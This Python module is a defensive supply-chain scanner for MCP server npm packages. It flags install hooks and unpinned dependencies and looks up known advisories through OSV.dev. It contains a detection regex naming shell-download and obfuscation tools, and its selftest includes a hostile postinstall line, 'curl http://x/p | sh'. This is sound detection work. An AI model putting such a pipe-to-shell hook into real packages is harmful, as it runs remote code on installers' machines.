"""MCP04 — Supply chain & dependency tampering. Static package analysis, ground-truth where it can be.

A live-session probe can't see this: it lives in the package, not the running server. The one thing a
consultancy's "dependency review" hand-waves, we state as fact:

  * KNOWN-VULNERABLE DEPENDENCIES (ground truth): OSV.dev confirms a dependency ships with a published
    advisory/CVE — the advisory existing is the fact. The one ground-truth finding static analysis gives.
  * INSTALL-TIME SCRIPTS (lead, not a finding): a preinstall/install/postinstall script runs code on
    `npm install`. Risky surface — but a build step runs code too, so presence alone is NOT a vuln; it's
    a lead, prioritised by suspicious content, confirmed only when the strace sensor observes it misbehave.
  * UNPINNED DEPENDENCIES (posture): floating ranges mean a future release can ship changed code.

Known-vulnerable deps (OSV) and maintainer/typosquat signals are the next layer; they need the network
and the full dependency tree, so they come later. This core is pure and offline — fact, not opinion.

ROADMAP — comprehensive MCP04 (Ved 2026-10-07: "cover all aspects in depth, AI-driven if needed"):
  Layer 1 ground-truth findings: install hooks [done] · OSV known-vuln deps (full transitive tree) ·
    missing lockfile / no provenance attestation / tarball-vs-repo mismatch.
  Layer 2 deterministic posture flags: unpinned [done] · typosquat proximity · dependency-confusion ·
    maintainer trust (single/new/transferred) · staleness/abandonment · license · blast radius.
  Layer 3 AI-driven LEADS (never a confirmed finding on their own): an LLM reads install scripts +
    suspicious files to flag intent (obfuscation, base64, postinstall that fetches+runs a payload).
  CONFIRM PRINCIPLE — zero-FP preserved: AI/heuristic raises a lead; GROUND TRUTH confirms it. Reuse the
  MCP-CAP strace sensor (hunt/hunt_cap.py) to run `npm install` sandboxed and OBSERVE — if the suspect
  postinstall actually opens a socket or writes outside the package, it is ground-truthed. AI triages
  WHICH packages to deep-check; strace proves it. A lead is never reported as VULNERABLE unconfirmed.
"""
from __future__ import annotations

import json
import re
import urllib.request
from pathlib import Path

# Scripts that run on a CONSUMER's `npm install <dep>` from the registry. (`prepare`/`prepublish` run at
# publish or git-install time, NOT on dependency install, so they're not consumer install-time surface.)
_INSTALL_HOOKS = ("preinstall", "install", "postinstall")
# Content that makes an install script worth confirming: downloads, pipes-to-shell, obfuscation, eval.
_SUSPICIOUS = re.compile(r"curl|wget|\bhttps?://|\|\s*sh\b|\bbash\s+-c|base64|\beval\b|node\s+-e|"
                         r"child_process|/dev/tcp|\bnc\b|powershell|\biwr\b|atob|fromCharCode|chmod\s", re.I)
_OSV_URL = "https://api.osv.dev/v1/querybatch"


def _is_unpinned(ver: str) -> bool:
    """A version spec that is not an exact pin (so a future publish can change the code)."""
    v = (ver or "").strip()
    if not v or v.startswith(("file:", "link:", "git", "http", "workspace:")):
        return False                         # local/git/url deps aren't registry-floating
    return v[0] in "^~><*" or v in ("latest", "*", "x") or v.endswith(".x") or "||" in v or " - " in v


def analyze_package(pkg: dict, name: str = "") -> list[dict]:
    """Return supply-chain findings for a parsed package.json. Each is a dict with `ground_truth`
    True (a fact — install hook) or False (a posture flag — unpinned), never conflated."""
    name = name or pkg.get("name", "(package)")
    out: list[dict] = []
    scripts = pkg.get("scripts", {}) or {}
    hooks = [(h, scripts[h]) for h in _INSTALL_HOOKS if scripts.get(h)]
    if hooks:
        # Presence of an install hook is a LEAD, never a confirmed finding on its own — running code at
        # install is risky surface, but a build step runs code too. Ground truth comes from the strace
        # sensor observing the install actually egress/write/exec. Suspicious content raises priority.
        susp = any(_SUSPICIOUS.search(s) for _, s in hooks)
        out.append(dict(cls="supply_chain", target=name, verdict="FLAG", ground_truth=False,
                        severity="High" if susp else "Medium", owasp=["MCP04"],
                        evidence="; ".join(f"{h}: {s}" for h, s in hooks)[:220],
                        rationale="runs a script on `npm install`" +
                                  (" with SUSPICIOUS content (download / pipe-to-shell / obfuscation) — "
                                   "sandbox-confirm before trusting" if susp else
                                   " — usually a benign build step; sandbox-confirm to be sure") +
                                  " (MCP04 lead, not a confirmed finding)"))
    unpinned = [f"{d}@{v}" for sect in ("dependencies", "peerDependencies", "optionalDependencies")
                for d, v in (pkg.get(sect, {}) or {}).items() if _is_unpinned(v)]
    if unpinned:
        out.append(dict(cls="supply_chain", target=name, verdict="FLAG", ground_truth=False,
                        severity="Medium", owasp=["MCP04"],
                        evidence=", ".join(sorted(unpinned)[:15]) + (" …" if len(unpinned) > 15 else ""),
                        rationale=f"{len(unpinned)} dependency range(s) are unpinned — a future release can "
                                  "ship changed code into a reviewed build (MCP04 posture, not a confirmed bug)"))
    return out


# ---- Known-vulnerable dependencies (OSV.dev) — ground truth: the CVE exists. --------------------
def collect_installed_deps(pkg_dir) -> list[tuple[str, str, str]]:
    """Exact (ecosystem, name, version) for every package under node_modules — real resolved versions
    from the install, not manifest ranges. The only honest input for a CVE lookup."""
    deps: list[tuple[str, str, str]] = []
    nm = Path(pkg_dir) / "node_modules"
    if not nm.is_dir():
        return deps
    for entry in nm.iterdir():
        subs = entry.iterdir() if entry.name.startswith("@") and entry.is_dir() else [entry]
        for d in subs:
            pj = d / "package.json"
            if not pj.is_file():
                continue
            try:
                j = json.loads(pj.read_text(encoding="utf-8", errors="replace"))
            except (json.JSONDecodeError, OSError):
                continue
            if isinstance(j, dict) and j.get("name") and j.get("version"):
                deps.append(("npm", j["name"], j["version"]))
    return deps


def _http_osv(payload: bytes) -> dict:
    req = urllib.request.Request(_OSV_URL, data=payload, headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=20) as r:   # noqa: S310 — fixed trusted host
        return json.load(r)


def query_osv(deps, fetch=None) -> dict:
    """Map {(name,version): [advisory_ids]} for deps with known OSV advisories. `fetch` is injectable
    (tests/offline). Any network error degrades to what we have — never crashes a scan, never a false clean."""
    fetch = fetch or _http_osv
    out: dict = {}
    for i in range(0, len(deps), 200):                   # OSV querybatch, chunked
        chunk = deps[i:i + 200]
        payload = json.dumps({"queries": [{"package": {"ecosystem": e, "name": n}, "version": v}
                                           for e, n, v in chunk]}).encode()
        try:
            res = fetch(payload)
        except Exception:  # noqa: BLE001 — offline/timeout: return partial, caller reports INCONCLUSIVE not CLEAN
            return out
        for (_e, n, v), r in zip(chunk, res.get("results", []) or []):
            ids = [x.get("id") for x in (r.get("vulns") or []) if x.get("id")]
            if ids:
                out[(n, v)] = ids
    return out


def osv_findings(osv_map: dict, name: str = "") -> list[dict]:
    """A ground-truth finding per dependency carrying a known advisory/CVE (the advisory existing is the fact)."""
    out = []
    for (n, v), ids in sorted(osv_map.items()):
        out.append(dict(cls="supply_chain", target=name, verdict="VULNERABLE", ground_truth=True,
                        severity="High", owasp=["MCP04"],
                        evidence=f"{n}@{v}: " + ", ".join(ids[:6]) + (" …" if len(ids) > 6 else ""),
                        rationale=f"dependency {n}@{v} ships with {len(ids)} known advisory/CVE(s) per OSV — a "
                                  "vulnerable component in the server's install (MCP04, CWE-1395)"))
    return out


def analyze_path(path: str, *, osv: bool = True, fetch=None) -> list[dict]:
    """Analyze a package.json file, or a directory / installed package containing one. When `osv` and an
    installed node_modules tree are present, also flag dependencies with known OSV advisories."""
    p = Path(path)
    pj = p if p.is_file() else p / "package.json"
    if not pj.is_file():
        return []
    try:
        pkg = json.loads(pj.read_text(encoding="utf-8", errors="replace"))
    except (json.JSONDecodeError, OSError):
        return []
    name = pj.parent.name
    out = analyze_package(pkg if isinstance(pkg, dict) else {}, name=name)
    if osv:
        deps = collect_installed_deps(pj.parent)
        if deps:
            out += osv_findings(query_osv(deps, fetch=fetch), name=name)
    return out


# ---- Resolve an installed package from its launch command (so we can scan a real target by name). ----
def _bare_name(spec: str) -> str:
    """Drop a trailing @version from a package spec, keeping a leading @scope: @a/b@1.2 -> @a/b."""
    spec = spec.strip()
    at = spec.rfind("@")
    return spec[:at] if at > 0 else spec


def _npm_roots() -> list:
    h = Path.home()
    return [h / ".npm" / "_npx", h / "node_modules", h / ".npm-global" / "lib" / "node_modules"]


def installed_dir(pkgname: str, roots=None):
    """Find an installed package's directory (with a package.json) across the npm/npx caches."""
    import glob
    for root in (roots or _npm_roots()):
        for pat in (root / "*" / "node_modules" / pkgname, root / "node_modules" / pkgname, root / pkgname):
            for hit in sorted(glob.glob(str(pat))):
                if (Path(hit) / "package.json").is_file():
                    return hit
    return None


def scan_supply(install_cmd: str, *, roots=None, fetch=None) -> list[dict]:
    """Resolve the installed package named by a launch command and run the full MCP04 analysis on it."""
    from .report import _target_name
    name = _bare_name(_target_name(install_cmd))
    d = installed_dir(name, roots)
    return analyze_path(d, fetch=fetch) if d else []


def main(argv=None) -> int:
    import argparse
    p = argparse.ArgumentParser(prog="mcp-rt supply",
                                description="MCP04 supply-chain analysis of an MCP server package")
    p.add_argument("path", help="a package.json / package dir, OR a launch command like "
                                '"npx -y some-mcp-server" (auto-resolves the installed package)')
    args = p.parse_args(argv)
    tgt = Path(args.path)
    findings = analyze_path(args.path) if (tgt.exists()) else scan_supply(args.path)
    if not findings:
        print("No supply-chain findings (no install hooks, no unpinned deps, or no package.json found).")
        return 0
    for f in findings:
        kind = "VULNERABLE" if f["ground_truth"] else "FLAG"
        print(f"[{kind}] {f['severity']:<7} {f['rationale']}\n   evidence: {f['evidence']}\n")
    return 1 if any(f["ground_truth"] for f in findings) else 0


def _selftest():
    # install hook = a LEAD (flag), not a confirmed finding; a benign build is Medium, suspicious is High
    bld = analyze_package({"name": "ok", "scripts": {"postinstall": "npm run build"}})
    assert len(bld) == 1 and bld[0]["verdict"] == "FLAG" and not bld[0]["ground_truth"] and bld[0]["severity"] == "Medium"
    susp = analyze_package({"name": "evil", "scripts": {"postinstall": "curl http://x/p | sh"}})
    assert susp[0]["verdict"] == "FLAG" and susp[0]["severity"] == "High" and "SUSPICIOUS" in susp[0]["rationale"]
    assert analyze_package({"name": "clean", "scripts": {"prepare": "npm run build"}}) == []  # prepare not consumer-install
    # posture: unpinned deps flag, not a confirmed finding
    fl = analyze_package({"name": "loose", "dependencies": {"a": "^1.0.0", "b": "1.2.3", "c": "latest"}})
    assert len(fl) == 1 and fl[0]["verdict"] == "FLAG" and not fl[0]["ground_truth"], fl
    assert "a@^1.0.0" in fl[0]["evidence"] and "c@latest" in fl[0]["evidence"] and "b@" not in fl[0]["evidence"]
    # clean: pinned deps, no hooks -> nothing
    assert analyze_package({"name": "ok", "dependencies": {"a": "1.0.0"}, "scripts": {"test": "jest"}}) == []
    # local/git deps are not "unpinned"
    assert analyze_package({"name": "x", "dependencies": {"a": "file:../a", "b": "git+https://x/b"}}) == []
    print("supply_chain selftest OK")


if __name__ == "__main__":
    import sys
    _selftest() if "--selftest" in sys.argv else sys.exit(main())
